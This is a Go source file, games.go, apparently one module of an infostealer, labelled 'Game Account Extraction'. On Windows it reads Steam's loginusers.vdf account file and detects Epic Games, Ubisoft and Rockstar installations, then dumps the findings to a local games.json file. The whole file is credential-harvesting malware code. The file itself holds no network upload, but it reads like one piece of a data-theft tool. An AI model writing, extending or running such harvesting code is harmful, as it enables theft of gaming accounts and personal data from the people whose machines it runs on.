// ============================================================
// games.go - Game Account Extraction
// ============================================================
package games

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

type GameAccount struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	Account string `json:"account"`
}

// Run extracts game account information
func Run() {
	log.Println("🎮 Extracting game accounts...")
	
	var games []GameAccount
	
	// Steam
	if steam := findSteam(); steam != nil {
		games = append(games, *steam)
	}
	
	// Epic Games
	if epic := findEpicGames(); epic != nil {
		games = append(games, *epic)
	}
	
	// Ubisoft
	if ubisoft := findUbisoft(); ubisoft != nil {
		games = append(games, *ubisoft)
	}
	
	// Rockstar
	if rockstar := findRockstar(); rockstar != nil {
		games = append(games, *rockstar)
	}
	
	saveGames(games)
}

// findSteam finds Steam account information
func findSteam() *GameAccount {
	if runtime.GOOS == "windows" {
		steamPath := filepath.Join(os.Getenv("PROGRAMFILES"), "Steam")
		if _, err := os.Stat(steamPath); err == nil {
			// Check for loginusers.vdf
			configPath := filepath.Join(steamPath, "config", "loginusers.vdf")
			if data, err := os.ReadFile(configPath); err == nil {
				return &GameAccount{
					Name:    "Steam",
					Path:    steamPath,
					Account: string(data),
				}
			}
		}
	}
	return nil
}

// findEpicGames finds Epic Games account information
func findEpicGames() *GameAccount {
	if runtime.GOOS == "windows" {
		epicPath := filepath.Join(os.Getenv("PROGRAMFILES"), "Epic Games")
		if _, err := os.Stat(epicPath); err == nil {
			return &GameAccount{
				Name:    "Epic Games",
				Path:    epicPath,
				Account: "Found Epic Games installation",
			}
		}
	}
	return nil
}

// findUbisoft finds Ubisoft account information
func findUbisoft() *GameAccount {
	if runtime.GOOS == "windows" {
		ubisoftPath := filepath.Join(os.Getenv("PROGRAMFILES"), "Ubisoft")
		if _, err := os.Stat(ubisoftPath); err == nil {
			return &GameAccount{
				Name:    "Ubisoft",
				Path:    ubisoftPath,
				Account: "Found Ubisoft installation",
			}
		}
	}
	return nil
}

// findRockstar finds Rockstar account information
func findRockstar() *GameAccount {
	if runtime.GOOS == "windows" {
		rockstarPath := filepath.Join(os.Getenv("PROGRAMFILES"), "Rockstar Games")
		if _, err := os.Stat(rockstarPath); err == nil {
			return &GameAccount{
				Name:    "Rockstar",
				Path:    rockstarPath,
				Account: "Found Rockstar installation",
			}
		}
	}
	return nil
}

// saveGames saves game information to file
func saveGames(games []GameAccount) {
	data, err := json.MarshalIndent(games, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal games: %v", err)
		return
	}
	
	if err := os.WriteFile("games.json", data, 0644); err != nil {
		log.Printf("❌ Failed to save games: %v", err)
		return
	}
	
	log.Printf("🎮 Found %d games", len(games))
}